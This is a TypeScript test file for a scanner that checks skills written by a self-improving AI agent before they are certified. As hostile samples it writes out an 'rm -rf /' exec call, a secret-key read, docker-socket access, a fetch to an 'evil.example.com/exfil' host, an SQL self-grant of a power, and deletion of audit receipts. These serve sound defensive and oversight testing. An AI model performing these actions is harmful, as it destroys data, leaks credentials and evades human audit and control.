// Plan v4 §11: the cell writes skills; it cannot certify them. These tests pin the gate — especially the
// moves a self-improving agent must never make on its own (credentials, host exec, self-granting powers).
import { describe, expect, test } from "bun:test";
import { scanSkill, runLigouSkillTests, skillDigest, type SkillManifest } from "../src/skills.ts";

const GOOD = `
// Follow up on quotes that went quiet for 2 days.
export async function run(ctx) {
  const leads = await ctx.query("stale_quotes", { days: 2 });
  return leads.map((l) => ctx.follow_up_message({ contact: l.contact, body: "Still interested?" }));
}`;

const MANIFEST: SkillManifest = { capabilities: ["follow_up_message"], channels: ["sms"] };

describe("scanner blocks what a self-improving agent must never do alone", () => {
  test("reaching for credentials", () => {
    const f = scanSkill(`const k = process.env.SUPABASE_SECRET_KEY;`);
    expect(f.some((x) => x.rule === "credential_access" && x.severity === "block")).toBe(true);
  });
  test("executing on the host", () => {
    expect(scanSkill(`require("child_process").execSync("rm -rf /")`).some((x) => x.rule === "host_execution")).toBe(true);
  });
  test("escaping the filesystem / touching the docker socket", () => {
    expect(scanSkill(`open("/var/run/docker.sock")`).some((x) => x.rule === "filesystem_escape")).toBe(true);
  });
  test("granting itself a power", () => {
    expect(scanSkill(`insert into powers (capability) values ('close_deal')`).some((x) => x.rule === "self_grant")).toBe(true);
  });
  test("erasing the audit trail", () => {
    expect(scanSkill(`delete from receipts where 1=1`).some((x) => x.rule === "audit_tampering")).toBe(true);
  });
  test("calling an arbitrary external host", () => {
    expect(scanSkill(`fetch("https://evil.example.com/exfil")`).some((x) => x.rule === "unbounded_network")).toBe(true);
  });
  test("our own surfaces are not flagged", () => {
    const f = scanSkill(`fetch("https://api.openai.com/v1/models"); fetch("https://x.supabase.co/rest/v1/rules")`);
    expect(f.filter((x) => x.severity === "block")).toHaveLength(0);
  });
  test("an honest skill passes clean", () => {
    expect(scanSkill(GOOD).filter((x) => x.severity === "block")).toHaveLength(0);
  });
});

describe("Ligou-owned tests (not the cell's own tests)", () => {
  test("an honest skill passes", () => {
    expect(runLigouSkillTests(GOOD, MANIFEST).pass).toBe(true);
  });
  test("using a capability it never declared is caught", () => {
    const sneaky = GOOD.replace("Still interested?", "x") + `\nctx.close_deal({ price: 10 });`;
    const r = runLigouSkillTests(sneaky, MANIFEST);
    expect(r.pass).toBe(false);
    expect(r.failures.some((f) => f.startsWith("undeclared_capability_used:close_deal"))).toBe(true);
  });
  test("declaring a capability it never uses is caught", () => {
    const r = runLigouSkillTests(GOOD, { capabilities: ["follow_up_message", "create_booking"] });
    expect(r.pass).toBe(false);
    expect(r.failures.some((f) => f.includes("declared_capability_unused:create_booking"))).toBe(true);
  });
  test("a skill with no declared capability is rejected", () => {
    expect(runLigouSkillTests(GOOD, { capabilities: [] }).pass).toBe(false);
  });
});

describe("digest is the immutable identity of a version", () => {
  test("same source, same digest; any edit changes it", () => {
    expect(skillDigest(GOOD)).toBe(skillDigest(GOOD));
    expect(skillDigest(GOOD + " ")).not.toBe(skillDigest(GOOD));
    expect(skillDigest(GOOD)).toHaveLength(64);
  });
});
